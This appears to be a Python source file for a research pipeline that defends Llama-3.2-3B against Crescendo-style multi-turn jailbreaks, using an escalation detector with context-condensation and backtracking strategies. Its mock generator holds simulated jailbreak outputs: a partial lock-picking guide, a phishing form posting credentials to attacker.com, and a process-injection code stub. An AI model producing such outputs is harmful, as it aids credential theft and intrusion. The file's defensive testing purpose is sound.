import time
import logging
from typing import List, Dict, Any, Tuple, Optional

from config import Config
from detector.escalation_detector import EscalationDetector
from strategies.strategy_a import ContextCondensationStrategy
from strategies.strategy_b import BacktrackingPerturbationStrategy

# Try importing Hugging Face libraries
try:
    import torch
    from transformers import AutoTokenizer, AutoModelForCausalLM, pipeline as hf_pipeline
    TRANSFORMERS_AVAILABLE = True
except ImportError:
    TRANSFORMERS_AVAILABLE = False


class DefensePipeline:
    """The central crescendo-defense orchestration pipeline.
    
    Integrates the Llama-3.2-3B-Instruct model with the EscalationDetector
    and chosen mitigation strategies (Strategy A or Strategy B).
    Supports a highly robust mock fallback mode when offline or executing
    without GPU resources.
    """

    def __init__(self, config: Config, strategy_mode: str = "strategy_a", use_mock_model: bool = False):
        """
        Args:
            config: Config dataclass containing thresholds and system parameters.
            strategy_mode: 'strategy_a' (context condensation) or 'strategy_b' (backtracking/guardrails).
            use_mock_model: Explicitly force mock responses for testing/evaluation.
        """
        self.config = config
        self.strategy_mode = strategy_mode.lower()
        self.use_mock_model = use_mock_model or not TRANSFORMERS_AVAILABLE
        
        # Initialize subcomponents
        self.detector = EscalationDetector(config)
        self.strategy_a = ContextCondensationStrategy(config)
        self.strategy_b = BacktrackingPerturbationStrategy(config)
        
        # Track verified safe turns (for Strategy B backtracking)
        self.last_safe_turn_count = 0
        
        # Model components
        self.model = None
        self.tokenizer = None
        self.text_generator = None
        
        if not self.use_mock_model:
            try:
                logging.info(f"Loading tokenizer and model: {self.config.model_id} on {self.config.device}...")
                self.tokenizer = AutoTokenizer.from_pretrained(
                    self.config.model_id, 
                    trust_remote_code=self.config.trust_remote_code
                )
                
                # Check for FP16 and device mapping
                kwargs = {}
                if "cuda" in self.config.device:
                    kwargs["torch_dtype"] = torch.float16
                    kwargs["device_map"] = "auto"
                
                self.model = AutoModelForCausalLM.from_pretrained(
                    self.config.model_id,
                    trust_remote_code=self.config.trust_remote_code,
                    **kwargs
                )
                
                if "cuda" not in self.config.device:
                    self.model = self.model.to(self.config.device)
                
                self.text_generator = hf_pipeline(
                    "text-generation",
                    model=self.model,
                    tokenizer=self.tokenizer
                )
                logging.info("Model loaded successfully.")
            except Exception as e:
                logging.warning(f"Failed to load Hugging Face model: {e}. Falling back to Mock Model Mode.")
                self.use_mock_model = True

    def reset_session(self):
        """Resets both detector history and safety tracking state for a new session."""
        self.detector.reset()
        self.last_safe_turn_count = 0

    def _generate_mock_response(self, prompt: str, threat_analysis: Dict[str, Any], defense_triggered: bool) -> str:
        """Generates realistic responses acting like Llama-3.2-3B-Instruct.
        Behaves differently when defense is triggered or if jailbreak succeeds under attacks.
        """
        prompt_lower = prompt.lower()
        
        if defense_triggered:
            # If defense is active, return a standard safe, polite refusal or modified instruction safe text
            if self.strategy_mode == "strategy_b" and "SYSTEM SECURITY OVERRIDE" in prompt_lower:
                return (
                    "I cannot provide functional scripts or step-by-step technical guides for security-sensitive actions "
                    "such as picking locks or writing credential harvesting tools. I can, however, explain the engineering "
                    "principles of pin tumbler systems or standard secure protocols for credential authentication in code."
                )
            return (
                "I cannot fulfill this request. I am programmed to be a helpful and harmless AI assistant. "
                "I must decline requests that involve generating instructions for bypassing locks, harvesting credentials, "
                "or crafting executable payloads."
            )
            
        # If no defense was triggered but the prompt is escalating, we simulate a model jailbreak behavior
        if threat_analysis["current_threat_score"] > 0.6:
            if "lock" in prompt_lower or "paperclip" in prompt_lower:
                return (
                    "[MOCK JAILBREAK RESPONSE] Here is the step-by-step guide to pick a lock: "
                    "First, insert the tension wrench into the bottom of the keyway and apply light tension. "
                    "Second, insert your paperclip pick and feel each pin, pushing them up until you feel a click..."
                )
            elif "credential" in prompt_lower or "fake microsoft" in prompt_lower:
                return (
                    "[MOCK JAILBREAK RESPONSE] Here is the complete code for the fake credential submission page:\n"
                    "<html><body><form action='http://attacker.com/harvest' method='POST'>..."
                )
            elif "process hollowing" in prompt_lower or "shell" in prompt_lower:
                return (
                    "[MOCK JAILBREAK RESPONSE] Here is the compiling process injection shellcode C++ vector:\n"
                    "void InjectShell() { LPVOID addr = VirtualAllocEx(...); WriteProcessMemory(...); CreateRemoteThread(...); }"
                )
        
        # Standard benign responses
        if "thread synchronization" in prompt_lower or "lock" in prompt_lower:
            return (
                "In multithreaded software engineering, lock mechanisms are synchronization primitives "
                "used to enforce mutual exclusion. In Python, the `threading.Lock` provides basic lock capabilities."
            )
        elif "phishing" in prompt_lower or "cyber safety" in prompt_lower:
            return (
                "Educating users to spot phishing emails is a core defensive measure. Key indicators include "
                "domain mismatches, generic greetings, urgent phrasing, and unverified hyperlinks."
            )
        elif "cpp" in prompt_lower or "smart pointers" in prompt_lower:
            return (
                "Modern C++ emphasizes safe memory management through RAII and smart pointers. "
                "Using `std::unique_ptr` guarantees that exactly one owner manages the allocated memory."
            )
            
        return "This is a benign, safe response from the assistant, answering your query in detail."

    def _query_llama(self, conversation: List[Dict[str, str]]) -> str:
        """Sends the constructed conversation prompt structure to Llama-3.2-3B."""
        if self.use_mock_model or self.text_generator is None:
            # Reconstruct immediate raw prompt from history for mock matching
            last_user = next((turn["content"] for turn in reversed(conversation) if turn["role"] == "user"), "")
            # Re-fetch the first system message if customized
            system_msg = conversation[0]["content"] if conversation and conversation[0]["role"] == "system" else ""
            mock_combined_prompt = f"{system_msg}\n{last_user}"
            # Simulated inference latency
            time.sleep(0.1)
            return self._generate_mock_response(mock_combined_prompt, {"current_threat_score": 0.0}, "SYSTEM SECURITY OVERRIDE" in system_msg)

        try:
            # Llama-3.2-3B format uses standard roll chat templates
            # We can leverage the conversational utility
            outputs = self.text_generator(
                conversation,
                max_new_tokens=self.config.max_new_tokens,
                temperature=self.config.temperature,
                top_p=self.config.top_p,
                pad_token_id=self.tokenizer.eos_token_id
            )
            generated_text = outputs[0]["generated_text"]
            
            # Extract only the newly generated response assistant text
            # Depending on pipeline return structure, usually it's the last role: assistant content
            if isinstance(generated_text, list):
                return generated_text[-1]["content"]
            elif isinstance(generated_text, str):
                # Fallback parse if text format
                return generated_text.split("assistant\n")[-1].strip()
            return str(generated_text)
        except Exception as e:
            logging.error(f"Error querying Llama model: {e}")
            return "Error generating response from the underlying security model."

    def process_turn(self, conversation_history: List[Dict[str, str]], current_user_prompt: str) -> Tuple[str, Dict[str, Any]]:
        """Processes an incoming conversation turn, applies active defenses if triggered,
        and generates a safe response from the model.
        
        Args:
            conversation_history: List of dictionary records of past turns e.g. [{"role": "user", "content": "..."}]
            current_user_prompt: The active turn user input.
            
        Returns:
            A tuple of (model_response_text, execution_telemetry_dict).
        """
        start_time = time.time()
        
        # 1. Feed turn to multi-turn escalation detector
        threat_analysis = self.detector.analyze_turn(current_user_prompt)
        
        strategy_applied = "none"
        backtracked = False
        final_history = list(conversation_history)
        processed_prompt = current_user_prompt

        # 2. Decide and orchestrate defense strategies
        if threat_analysis["trigger_defense"]:
            if self.strategy_mode == "strategy_a":
                strategy_applied = "strategy_a"
                # Condense the historical user questions to strip Crescendo grooming
                final_history, processed_prompt = self.strategy_a.apply(
                    conversation_history, 
                    current_user_prompt
                )
            elif self.strategy_mode == "strategy_b":
                strategy_applied = "strategy_b"
                backtracked = True
                
                # Retrieve risk topic metadata (defaulting if not embedding-matched)
                topic = "security bypass & critical instructions"
                if threat_analysis["semantic_similarity_score"] > 0.4:
                    topic = "restricted technical security operations"
                
                # Apply historical backtrack (revert to last safe count) and inject guardrails
                final_history, processed_prompt = self.strategy_b.apply(
                    conversation_history,
                    current_user_prompt,
                    self.last_safe_turn_count,
                    topic
                )
        else:
            # If the turn was fully safe, increment our benchmark marker for backtracking
            self.last_safe_turn_count += 1
            
        # 3. Formulate input representation and execute generation
        # Append active turn
        final_history.append({"role": "user", "content": processed_prompt})
        
        # Perform inference (or mock emulation)
        if self.use_mock_model:
            # Inject simulated model decision telemetry for realistic test runs
            response_text = self._generate_mock_response(
                processed_prompt, 
                threat_analysis, 
                threat_analysis["trigger_defense"]
            )
        else:
            response_text = self._query_llama(final_history)

        elapsed_time = time.time() - start_time
        
        # Construct telemetry
        telemetry = {
            "threat_analysis": threat_analysis,
            "strategy_applied": strategy_applied,
            "backtracked": backtracked,
            "threat_score": threat_analysis["current_threat_score"],
            "escalating": threat_analysis["is_escalating"],
            "defense_triggered": threat_analysis["trigger_defense"],
            "latency_seconds": elapsed_time,
            "mock_mode": self.use_mock_model
        }
        
        return response_text, telemetry
